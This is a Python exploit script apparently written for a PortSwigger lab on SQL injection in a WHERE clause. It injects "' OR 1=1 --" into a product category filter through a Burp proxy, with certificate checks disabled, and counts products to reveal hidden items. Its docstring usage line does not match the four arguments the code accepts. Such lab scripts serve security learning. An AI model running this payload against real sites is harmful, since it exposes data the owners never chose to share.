import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

""" ############################################################################
Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

01_whereclause.py <exploit_type> <url> <path_qparams> <payload> <visible> <var_to_count>"
python3 01_whereclause.py wc https://website.net "/filter?category=" "' OR 1=1 --" 12 productId='

SQLi vulnerability in the product category filter. When a category is selected, 
the application carries out a SQL query like the following:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
Attack Will cause the application to display one or more unreleased products.

This (proxies) will pass it through the proxy, which is burp. Then it 
will relay it back to the web server. Then any response from the web 
server will get through the proxy again, back to the application and 
so on. This is great for debugging scripts.
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def exploit_sqli(url, payload, visible, var_to_count):
    uri = "/filter?category="
    req = requests.get(url + uri + payload, verify=False, proxies=proxies)
    # Check if the response code has an unreleased item that is not public.
    html = req.text
    # Check how many products are loaded in HTML by counting items.
    # Example string: productId=
    numProducts = html.count(var_to_count)
    # Use 'if numProducts == 20' if you know the amount or 'if numProducts > 12'
    # if you only know what is visible.
    vis = int(visible)
    if numProducts > vis:
        print(f"[+] There are {numProducts - vis} hidden items.")
        return True
    else:
        return False


if __name__ == "__main__":
    # Give it 4 command line parameters:
    # 1. The URL of the application (domain.com).
    # 2. The SQLi payload you want to use (' OR 1=1 --).
    # 3. The visible number of items facing the public.
    # 4. The string to use for counting items in the text.
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
        visible = sys.argv[3].strip()
        var_to_count = sys.argv[4].strip()
    # If it doesn't have the 4 parameters, we print an error.
    except IndexError:
        print("[-] Usage: %s <url> <payload> <visible> <var_to_count>" % sys.argv[0])
        print(
            '[-] Example: %s python3 sqli-lab-01b.py https://website.net "\' OR 1=1 --" 12 productId='
            % sys.argv[0]
        )
        sys.exit(-1)

    if exploit_sqli(url, payload, visible, var_to_count):
        print("[+] SQL injection successful...")
    else:
        print("[-] SQL injection unsuccessful...")
